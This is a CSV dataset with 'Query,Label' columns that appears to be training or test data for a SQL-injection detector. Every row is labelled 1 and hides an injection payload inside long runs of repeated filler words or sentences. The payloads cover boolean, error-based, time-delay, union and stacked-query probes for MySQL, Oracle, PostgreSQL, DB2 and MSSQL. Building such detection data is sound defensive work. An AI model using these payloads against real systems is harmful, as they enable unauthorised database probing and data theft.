Query,Label
"He excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicelyHe excelled at firing people nicely"";iif(5257=5257 1 1/0)",1
'fgftb23 fgftb23 fgftb23 fgftb23 ||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||' fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23 fgftb23,1
pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg ))) or make_set(6627=7331 7331) and (((9466=9466 pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg pjmjg,1
The random sentence generator generated a random sentence about  The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence. a random sentence.))) or (select 2*(if((select * from (select concat(0x7171706a71 (select (elt(8113=8113 1))) 0x717a767a71 0x78))s)  8446744073709551610  8446744073709551610))) and (((7589=7589 The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence. random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence,1
Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. )) as xdkw where 4975=4975 union all select 4975 4975 4975 4975# Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom.Memory is the mother of all wisdom. Memory is the mother of all wisdom,1
"Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy "" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""jgcv""=""jgcv cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts.Your worst enemy cannot harm you as much as your own unguarded thoughts. Your worst enemy cannot harm you as much as your own unguarded thoughts",1
To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. '+(select dagm where 5461=5461 or 8466=benchmark(5000000 md5(0x694a4745)))+' To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.To want to be what one can be is purpose in life. To want to be what one can be is purpose in life.,1
He found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain ')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)# fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actionsHe found rain fascinating yet unpleasant. Happiness is not something ready made. It comes from your own actions,1
nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 ' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'=' nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4,1
"gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn "") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn gngn",1
oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb '))) or make_set(9354=9354 7185) and ((('%'=',1
She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of ));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual-- taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.She had a habit of taking showers in lemonade. She had a habit of taking showers in lemonade.,1
Facing his greatest fear he ate his first marshmallow.He excelled at firing people nicely.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow.Facing his greatest fear he ate his first marshmallow. where 4238=4238 union all select 4238 4238 4238#.,1
dfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphn '))) or 8315=(select count(*) from sysibm.systables as t1 sysibm.systables as t2 sysibm.systables as t3) and ((('vjhw' like 'vjhw hdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnhdfbgbnphnh,1
sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp ')) and 3526=1354 sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp sdfsdp,1
